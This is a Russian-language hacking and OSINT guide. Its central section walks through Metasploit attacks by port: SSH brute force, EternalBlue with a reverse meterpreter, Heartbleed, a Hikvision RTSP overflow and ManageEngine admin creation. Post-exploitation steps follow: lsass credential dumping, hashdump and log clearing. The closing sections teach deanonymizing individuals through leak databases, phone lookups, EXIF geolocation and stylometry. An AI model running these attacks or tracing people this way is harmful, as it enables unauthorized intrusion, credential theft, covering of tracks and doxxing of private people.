THE OSINT ARCHITECTURE

0x01: Username — Цифровой след в песке

Представь, что интернет — это огромный пляж. Юзернейм — это уникальный рисунок протектора твоих кроссовок. Куда бы ты ни пошел, ты оставляешь этот след. OSINT-мастер просто идет по этим следам от одной "песочницы" (сайта) к другой.

Поиск по никнейму основан на теории повторного использования. Если человек зарегистрировался как "ArchZero" в Steam, с вероятностью 80% он под этим же именем сидит в Telegram или на форуме программистов.

bash — user@kali
user@kali:~$ maigret EliteArchangel --tags
[SEARCHING...]
[+] Match found: GitHub (Developer, Python)
[+] Match found: Twitter (Yekaterinburg, 2026)
Maigret GitHub

0x02: WHOIS — Паспорт дома в сети

WHOIS — это как выписка из реестра недвижимости. Вы можете увидеть, кто купил этот кусок "земли" (домен), когда истекает аренда и какой "телефонный номер" (DNS) к нему привязан.

Этот протокол позволяет заглянуть за кулисы сайта. Даже если владелец скрыл данные, история WHOIS (Historical Data) может помнить, какой email был привязан к домену 5 лет назад.

0x03: Nmap — Стук в закрытые двери

Nmap — это как инспектор, который идет по темному коридору отеля и дергает за ручки каждой двери. Если дверь открыта, он заглядывает внутрь и спрашивает: "Кто тут живет?".
Флаг Что делает (Метафора)
-sS Тихий стук. Вы проверяете дверь, но убегаете до того, как хозяин посмотрит в глазок.
-sV Допрос. Вы заставляете сервис представиться: "Я — сервер Apache версии 2.4".
-Pn Штурм. Вы не спрашиваете, дома ли кто-то (ping), а сразу лезете в окна (порты).

0x04: Metasploit — Универсальная отмычка

Если Nmap нашел слабую дверь, Metasploit — это чемоданчик с тысячей разных ключей. Вам нужно просто выбрать правильный под конкретный замок.

Это мощнейший фреймворк, где автоматизированы тысячи известных уязвимостей. Для работы с Android он использует Meterpreter — это как невидимый шпион, который поселяется внутри телефона и выполняет любые ваши приказы.

msfconsole
msf6 > use exploit/multi/handler
# Настройка приема сигнала от "шпиона"

🎯 Полный гайд: Взлом по IP с Metasploit (порты 554, 443, 445, 22, 8022)

Ниже приведена пошаговая тактика для каждого порта. В реальных атаках всегда начинай с nmap, затем сверяй баннеры с уязвимостями и используй search в Metasploit для поиска модуля.

🔐 1️⃣ Порт 22 (SSH) — брутфорс логинов

Сценарий: SSH часто используют для удаленного управления серверами. Если пароль слабый — можно подобрать.

msfconsole
msf6 > search ssh_login
[+] Found auxiliary/scanner/ssh/ssh_login
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false
msf6 auxiliary(scanner/ssh/ssh_login) > run
[+] SSH - Success: 'root:123456'
[*] Command shell session 1 opened (192.168.1.10:45678 -> 192.168.1.100:22)

✅ Если подобрал пароль — получишь шелл. Затем можно апгрейдить до meterpreter через sessions -u 1.

💥 2️⃣ Порт 445 (SMB) — EternalBlue (MS17-010)

Сценарий: Легендарная уязвимость в SMBv1, позволяет удаленно выполнить код на Windows 7/2008/R2 без логина[reference:0]. Самая опасная дыра для корпоративных сетей.

msfconsole
msf6 > search ms17-010
[+] exploit/windows/smb/ms17_010_eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(ms17_010_eternalblue) > check
[+] The target is vulnerable.
msf6 exploit(ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.1.10:4444
[*] Sending stage (200774 bytes) to 192.168.1.100
[*] Meterpreter session 2 opened

⚠️ EternalBlue — самый быстрый путь к SYSTEM на Windows. Но не забудь set ForceExploit true, если цель не определяется автоматически.

🔒 3️⃣ Порт 443 (HTTPS) — Heartbleed (CVE-2014-0160) и Apache модули

Сценарий: Если на 443 крутится старая версия OpenSSL, уязвимость Heartbleed позволяет читать память сервера (вплоть до приватных ключей)[reference:1]. А если там Apache с mod_ssl — может быть старая дыра (например, Kioptrix).

msfconsole
msf6 > search heartbleed
[+] auxiliary/scanner/ssl/openssl_heartbleed
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 443
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
[+] Heartbleed vulnerability detected
[!] Leaked 64 KB of memory — можно достать cookies, логины, ключи

📌 Если Heartbleed не сработал, попробуй auxiliary/scanner/http/ssl_version и exploit/multi/http/apache_mod_cgi_bash_env (Shellshock для Apache). Для реального шелла часто используют hta_server на 443 с фейковым сертификатом[reference:2].

📹 4️⃣ Порт 554 (RTSP) — взлом видеонаблюдения (Hikvision, DVR)

Сценарий: RTSP используют IP-камеры и видеорегистраторы. Многие имеют стандартные пароли или переполнение буфера[reference:3]. Например, Hikvision DVR уязвим через RTSP-запрос[reference:4].

msfconsole
msf6 > search rtsp
[+] exploit/linux/misc/hikvision_rtsp_bof
msf6 > use exploit/linux/misc/hikvision_rtsp_bof
msf6 exploit(hikvision_rtsp_bof) > set RHOST 192.168.1.200
msf6 exploit(hikvision_rtsp_bof) > set RPORT 554
msf6 exploit(hikvision_rtsp_bof) > set PAYLOAD linux/armle/meterpreter_reverse_tcp
msf6 exploit(hikvision_rtsp_bof) > set LHOST 192.168.1.10
msf6 exploit(hikvision_rtsp_bof) > exploit
[*] Sending malicious RTSP request...
[+] Buffer overflow triggered, shell obtained

🔍 Альтернатива — брутфорс стандартных логинов для RTSP (например, admin:admin). Также порт 8554 иногда дублирует RTSP[reference:5]. Используй auxiliary/scanner/rtsp/rtsp_login.

💻 5️⃣ Порт 8022 — Desktop Central (управление IT-инфраструктурой)

Сценарий: ManageEngine Desktop Central 9 часто висит на 8022[reference:6]. Уязвимость позволяет создать админ-аккаунт через DCPluginServlet[reference:7].

msfconsole
msf6 > search desktopcentral
[+] exploit/windows/http/manageengine_desktopcentral_admin_creat
msf6 > use exploit/windows/http/manageengine_desktopcentral_admin_creat
msf6 exploit(manageengine_desktopcentral_admin_creat) > set RHOSTS 192.168.1.100
msf6 exploit(manageengine_desktopcentral_admin_creat) > set RPORT 8022
msf6 exploit(manageengine_desktopcentral_admin_creat) > set TARGETURI /
msf6 exploit(manageengine_desktopcentral_admin_creat) > exploit
[+] Administrator account 'metasploit' created
[*] Now you can login and deploy custom agents

⚙️ После эксплуатации ты можешь легитимно войти в веб-консоль Desktop Central и развернуть свои пэйлоады на всех управляемых агентах — это почти полный контроль над всей сетью предприятия.

🧠 POST-ЭКСПЛУАТАЦИЯ: Миграция и дамп паролей (Meterpreter)

Как только получил meterpreter — не останавливайся. Мигрируй в системный процесс и вытаскивай хэши:

meterpreter> ps
meterpreter> migrate -N lsass.exe
meterpreter> load kiwi
meterpreter> creds_all
[+] Dumped NTLM hashes and plaintext passwords from memory
meterpreter> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

💡 Совет профи: Всегда делай background текущей сессии и запускай sessions -u для апгрейда до meterpreter, если попал через шелл. И не забывай чистить логи (clearev).

0x05: Мануал по скриншотам (Метод Шерлока)

Один скриншот — это тысячи слов. Чтобы найти человека по картинке, нужно быть внимательным к мелочам:

  • Часы и Батарея: Процент заряда и время помогают понять, как давно был сделан кадр и в каком часовом поясе живет цель.
  • Иконки связи: Значок "VoLTE" или специфический вид иконки Wi-Fi подскажут модель телефона или версию Android.
  • Тени и Отражения: В отражении экрана или очков можно увидеть комнату, вид из окна или даже лицо того, кто делает скриншот.
  • Банковские приложения: Даже край иконки приложения банка может выдать страну (Сбербанк — РФ, Kaspi — Казахстан и т.д.).

0x06: Поиск физического аккаунта по Username

«Физический аккаунт» — это не просто ник в соцсети, а привязка к реальному человеку: номер телефона, паспортные данные, геолокация, место работы или учёбы. Имея только юзернейм, можно выйти на эти данные через цепочку утечек и открытых источников.

Шаг 1. Сбор всех возможных связей ника
Используй Sherlock или Maigret (уже был выше) — они покажут, где засветился юзернейм. Затем вручную проверь: Telegram (@username), VK (https://vk.com/username), Instagram, Twitter, TikTok, Discord, GitHub. На многих платформах можно увидеть реальное имя или email в разделе "о себе".

bash — osint-merge
user@kali:~$ sherlock TargetNick
[+] Telegram: https://t.me/TargetNick (phone hidden, but bio: 'Sysadmin from SPb')
[+] GitHub: commits with email target@pm.me
[!] Email found → дальнейший поиск по email (holehe, dehashed)

Шаг 2. От email к телефону и имени
Пробиваем email через holehe (покажет, на каких сервисах зарегистрирован email). Если email слит в утечку (например, Collection #1, Adobe, LinkedIn), используй DeHashed или LeakCheck — там могут быть пароли, а главное — номер телефона и хеш паспорта. Номер телефона затем ищем в Telegram (боты типа @get_id_bot), WhatsApp, Viber — иногда стоит аватарка с лицом.

Шаг 3. Геолокация через посты и фото
Проверь все фото, которые выложил пользователь с этим ником. Скачай оригиналы и посмотри EXIF-метаданные (команда exiftool в Linux). Могут быть GPS-координаты, модель камеры, дата. Даже если GPS стёрт, иногда остаётся ID дома (например, в фото с iPhone сохраняется регион).
Анализируй текст постов: упоминания кафе, станций метро, местных мероприятий. Используй Google Dorks: site:instagram.com "TargetNick" место.

exiftool target.jpg
GPS Position : 55.751244, 37.618423 (Moscow, Red Square area)
Create Date : 2025:08:15 14:23:11
→ Вероятно, цель была в центре Москвы в августе 2025

Шаг 4. Поиск по номеру телефона
Если ты получил номер телефона, используй GetContact (Android/Web версии) — там люди сами подписывают, как записан контакт (часто реальное имя). Также проверь, привязан ли номер к профилю в Telegram, WhatsApp (через добавление в контакты). Некоторые сервисы (например, Numbuster) определяют оператора и регион.

0x07: Психолингвистика и стилометрия — найти человека по манере общения

Даже если человек использует разные ники, аватарки и email, он остаётся собой — его уникальный «словесный отпечаток» (стиль, лексика, ошибки, эмодзи, время постов) выдаёт его на любой платформе. Это называется стилометрия.

Признаки, которые нельзя скрыть:

  • Уникальные слова-паразиты и междометия: «кста», «хз», «ага», «нууу», «жесть», «imho» — каждый человек имеет свой набор.
  • Пунктуация и капс: кто-то ставит многоточие в конце каждого сообщения... Другой пишет ВСЕГДА КАПСОМ или, наоборот, без заглавных букв. Кто-то не ставит пробел после запятой,а это сразу бросается в глаза.
  • Эмодзи-почерк: один человек использует только 🤔😂🔥, другой — 🥸🧠🕵️. Стиль комбинирования эмодзи уникален.
  • Время активности: если на форуме A пользователь пишет каждый день в 23:00-02:00, а на форуме B — тоже ночью по тому же часовому поясу, это сильный маркер.
  • Опечатки и их тип: одни постоянно путают «тся/ться», другие — «ие/ее». Автоматические переводчики выдают одинаковые ошибки.
  • Длина сообщений и среднее количество слов: болтуны пишут простыни, лаконичные люди — 3-5 слов.
Практический кейс: У тебя есть подозреваемый с ником «Xaos_77» на одном трекер-форуме. На другом ресурсе он зарегистрирован как «Hunter_Zero» — ники не пересекаются. Но на обоих ресурсах он:
• пишет «патамушта» вместо «потому что»
• всегда ставит смайлик «:3» после вопроса
• использует даш (-) вместо длинного тире и обожает слово «карл!»
→ Вероятность, что это один человек — более 90%.

Инструменты для автоматической стилометрии:

  • JStylo / Anonymouth — анализ стиля текста, сравнение авторства.
  • GitHub Copilot для OSINT — можно скормить нейросети (например, GPT) несколько сообщений и спросить: «Оцени, похож ли этот текст на автора вот этих?»
  • Метод «контрольных фраз»: задай на разных платформах один и тот же вопрос цели (например, «Какой твой любимый фильм?»). Если ответы совпадают по структуре — совпадение.

Как тренировать наблюдательность: Выбери любого своего знакомого. Найди его в двух разных соцсетях (даже если ники разные). Составь список из 10 стилистических черт (эмодзи, ошибки, частота использования тире, приветствия). Ты увидишь, что даже в официальном LinkedIn он пишет так же, как в анонимном Telegram-канале. Эта «суперсила» позволяет деанонимизировать человека без единого технического инструмента.

0x08: Чек-лист OSINT-архитектора

Короткая памятка, чтобы ничего не упустить:

  • ✅ Собрать все платформы по нику (Maigret/Sherlock).
  • ✅ Извлечь email, телефон, фото, реальное имя из найденных профилей.
  • ✅ Пробить email через holehe и leak-базы.
  • ✅ Проанализировать EXIF-данные всех изображений.
  • ✅ Сравнить стиль общения на разных аккаунтах (даже если ники разные).
  • ✅ Использовать Google Dorks: intitle:никнейм, inurl:никнейм, filetype:pdf "никнейм".
  • ✅ Проверить архивы Wayback Machine (archive.org) — старые страницы часто хранят удалённые данные.
